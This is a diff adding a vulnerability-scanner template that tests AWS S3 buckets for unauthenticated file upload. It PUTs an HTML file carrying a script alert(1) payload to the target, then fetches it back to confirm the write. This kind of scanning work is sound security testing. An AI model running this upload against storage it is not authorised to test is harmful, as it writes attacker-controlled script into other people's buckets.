@@ -1,0 +1,34 @@
+id: aws-s3-arbitrary-file-upload
+
+info:
+  name: aws-s3-arbitrary-file-upload
+  author: xxx
+  severity: high
+  tags: fileupload
+
+http:
+  - raw:
+      - |
+        GET /{{randstr}}.html HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        PUT /{{randstr}}.html HTTP/1.1
+        Host: {{Hostname}}
+        Content-Disposition: inline
+        Content-Type: text/html; charset=utf-8
+        Content-Length: 0
+
+        <!DOCTYPE html><html><script>alert(1)</script></html>
+      - |
+        GET /{{randstr}}.html  HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 404 && status_code_2 == 200'
+          - 'contains(body_3, "<html><script>alert(1)</script></html>") && status_code_3 == 200'
+        condition: and
